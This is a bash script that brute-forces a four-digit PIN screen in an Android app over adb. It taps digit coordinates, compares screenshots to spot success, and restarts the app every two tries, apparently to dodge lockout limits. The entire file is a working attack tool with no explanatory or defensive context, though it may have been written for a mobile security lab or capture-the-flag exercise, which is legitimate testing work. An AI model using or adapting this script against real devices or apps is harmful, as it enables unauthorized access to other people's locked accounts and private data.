#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <package_name> <main_activity>"
    exit 1
fi

PACKAGE_NAME="$1"
MAIN_ACTIVITY="$2"

declare -A coords
coords[1]="202 1200"
coords[2]="549 1200"
coords[3]="858 1200"
coords[4]="202 1455"
coords[5]="549 1455"
coords[6]="858 1455"
coords[7]="212 1683"
coords[8]="535 1683"
coords[9]="882 1683"
coords[0]="545 1953"

MAX_PINCODE=9999
RETRIES_BEFORE_RESTART=2
attempt_counter=0
success_found=0


restart_app() {
    adb shell am start -n "$PACKAGE_NAME/$MAIN_ACTIVITY" -S
    sleep 1
}


press_button() {
    local digit=$1
    adb shell input tap ${coords[$digit]}
}

take_screenshot() {
    sleep 1s
    local filename=$1
    adb shell screencap -p /sdcard/screen.png
    adb pull /sdcard/screen.png "$filename" >/dev/null
}


compare_screenshots() {
    local img1=$1
    local img2=$2
    local result
    result=$(compare -metric RMSE "$img1" "$img2" null: 2>&1 | awk '{print $1}')
    echo "Diff image: $result"
    if (( $(echo "$result < 6785.59" | bc -l) )); then
        return 0
    else
        return 1
    fi
}


take_screenshot "prev_screen.png"


restart_app
for PINCODE in $(seq -f "%04g" 1230 $MAX_PINCODE); do
    echo "Trying PIN $PINCODE"


    for (( i=0; i<${#PINCODE}; i++ )); do
        digit=${PINCODE:i:1}
        press_button $digit
        sleep 0.01
    done
    take_screenshot "new_screen.png"

    if compare_screenshots "prev_screen.png" "new_screen.png"; then
        echo "PIN $PINCODE is incorrect (screenshots are similar)"
    else
        echo "Success! PIN is pwned: $PINCODE"
        success_found=1
        break
    fi
    mv "new_screen.png" "prev_screen.png"
    ((attempt_counter++))


    if (( attempt_counter % RETRIES_BEFORE_RESTART == 0 )); then
        restart_app
    fi
done

if [ "$success_found" -eq 1 ]; then
    echo "PIN successfully found!"
else
    echo "Brute force complete, but no correct PIN found."
fi
